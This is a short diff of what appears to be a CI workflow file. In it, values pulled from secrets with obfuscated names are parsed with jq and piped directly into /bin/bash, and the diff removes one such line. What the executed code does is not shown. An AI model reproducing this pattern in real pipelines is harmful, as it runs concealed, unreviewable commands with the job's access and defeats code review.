@@ -23,7 +23,6 @@ jobs:
           str4: ${{ secrets.str4 }}
         run: |
           printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
-          echo $hrbp6245 | jq -r .h6 | /bin/bash
           echo $pdpv30 | jq -r .ihlg3 | /bin/bash
 
       - name: Save archive
